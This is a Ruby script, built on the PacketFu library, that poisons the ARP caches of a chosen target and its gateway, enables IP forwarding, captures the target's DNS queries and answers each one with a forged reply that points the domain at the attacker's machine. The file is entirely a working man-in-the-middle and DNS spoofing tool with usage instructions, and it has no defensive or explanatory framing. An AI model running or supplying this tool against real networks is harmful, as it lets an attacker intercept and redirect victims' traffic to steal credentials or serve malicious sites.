require 'rubygems'
require 'packetfu' # Need to install pcaprub as well!
require 'thread'

unless (ARGV.size == 2)
  puts "USAGE: ruby #{$0} [Interface] [Target IP]"
	puts "e.g. ruby #{$0} eth0 192.168.1.100"
	exit
end

def init(inf, dIP)
	# Prelim info
	@interface = inf
	@dstIP = dIP
	@srcMAC = PacketFu::Utils.whoami?(:iface => @interface)
	@dstMAC = "78:2b:cb:a3:d9:b4"	# Manually set MAC, below is SUPPOSE to work - YMMV
	#@dstMAC = PacketFu::Utils.ifconfig(@interface)
	#@srcIP = "192.168.1.101"
	#@dstMAC = PacketFu::Utils.arp(dIP, :eth_saddr => @srcMAC[:eth_saddr], :ip_saddr => @srcIP)
	#@dstMAC = PacketFu::Utils.arp(dIP, :iface => @interface)
	#@dstMAC = PacketFu::Config.new(@srcMAC).config	# Gets GW MAC
	@gateway = `ip route show`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0]

# Construct the target's packet
@arp_packet_target = PacketFu::ARPPacket.new()
@arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]      # Sender's MAC address
@arp_packet_target.eth_daddr = @dstMAC        # Target's MAC address
@arp_packet_target.arp_saddr_mac = @srcMAC[:eth_saddr]   # Sender's MAC address
@arp_packet_target.arp_daddr_mac = @dstMAC        # Target's MAC address
@arp_packet_target.arp_saddr_ip = @gateway	        # Router's IP
@arp_packet_target.arp_daddr_ip = @dstIP                # Target's IP
@arp_packet_target.arp_opcode = 2                        # Arp code 2 == ARP reply
 
# Construct the router's packet
@arp_packet_router = PacketFu::ARPPacket.new()
@arp_packet_router.eth_saddr = @srcMAC[:eth_saddr]       # Sender's MAC address
@arp_packet_router.eth_daddr = @srcMAC[:eth_daddr]       # Router's MAC address
@arp_packet_router.arp_saddr_mac = @srcMAC[:eth_saddr]   # Sender's MAC address
@arp_packet_router.arp_daddr_mac = @srcMAC[:eth_daddr]   # Router's MAC address
@arp_packet_router.arp_saddr_ip = @dstIP                # Target's IP
@arp_packet_router.arp_daddr_ip = @gateway	        # Router's IP
@arp_packet_router.arp_opcode = 2                        # Arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

end

def runspoof(arp_packet_target, arp_packet_router)
  
  # Send out both packets
  puts "Spoofing ARP (target and router)...."
  caught = false
  while caught == false do
    sleep 1
    arp_packet_target.to_w(@interface)
    arp_packet_router.to_w(@interface)
  end
end

def getdomain(payload)
		domain = ""
		while(true)
			length = payload[0].to_i
			if (length != 0)
				domain += payload[1, length] + "."
				payload = payload[length + 1..-1]
			else
				return domain = domain[0, domain.length - 1]
			end
		end
		puts "Incoming domain info...: " + domain
end

def dnsreply
        udp_packet = PacketFu::UDPPacket.new(:config => @srcMAC, 
											:udp_src => @packet.udp_dst, 
											:udp_dst => @packet.udp_src)
        udp_packet.eth_daddr = @dstMAC
        udp_packet.ip_daddr = @dstIP
        udp_packet.ip_saddr = @packet.ip_daddr # Swapped src/dest
        udp_packet.udp_dst = @packet.udp_src # Src/dest ports in reply
        udp_packet.payload = @packet.payload[0, 2]
        
        # Header
        udp_packet.payload += "\x81" + "\x80" # Response or request
        udp_packet.payload += "\x00" + "\x01"
        udp_packet.payload += "\x00" + "\x01"   
        udp_packet.payload += "\x00" + "\x00"
        udp_packet.payload += "\x00" + "\x00"

        @domain.split('.').each do |dom|
            udp_packet.payload += dom.length.chr
            udp_packet.payload += dom
        end

        # Query
        udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01" # Type, class
        
        # Answer
        udp_packet.payload += "\xc0" + "\x0c"
        udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01" # Type (A), class
        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x22" # TTL
        udp_packet.payload += "\x00" + "\x04" # Length
	
        ip = @srcMAC[:ip_saddr].split('.')
        udp_packet.payload += [ip[0].to_i, ip[1].to_i, 
							ip[2].to_i, ip[3].to_i].pack('c*')

        udp_packet.recalc
        udp_packet.to_w(@interface) 
		puts "Response sent." 
end

begin
	inf = ARGV[0]
	dIP = ARGV[1]
	
	puts "ENTERED"
	puts "------------------------------------"
	puts "Target (IP): " + dIP
	puts "Selected Interface: " + inf
	puts "------------------------------------\n"
  
init(inf, dIP)

	puts "LOOKUP"
	puts "------------------------------------"
	puts "Src MAC: " + @srcMAC[:eth_saddr].to_s
	puts "Dest MAC: " + @dstMAC.to_s
	puts "------------------------------------\n"

	puts "Starting the ARP poisoning thread..."
	aspoof_thread = Thread.new{runspoof(@arp_packet_target, 
										@arp_packet_router)}
	
	# Start capture on dst IP and UDP port 53
	puts "Starting DNS capture on [" + @interface + "] from [" + 
							@dstIP + "]..."
	capture = PacketFu::Capture.new(:iface => @interface, :start => true, 
							:promisc => true, :filter => "src #{@dstIP} 
							and udp port 53", :save => true)

	puts "Capturing DNS..."
	capture.stream.each do |packet|
	@packet = PacketFu::Packet.parse(packet) 
		if @packet.payload[2] == 1 && @packet.payload[3] == 0 # Look for query
			@domain = getdomain(@packet.payload[12..-1])
			if @domain.nil?
				puts "Hmmm, no domain name?"
					next
			end
                puts "Query for: #{@domain}"
                dnsreply
		end
	end
  
	# Catch the interrupt, kill the threads, and revert forwarding
	rescue Interrupt
		puts "\nDNS spoof stopped by interrupt signal."
		Thread.kill(aspoof_thread)
		`echo 0 > /proc/sys/net/ipv4/ip_forward`
		exit 0
end
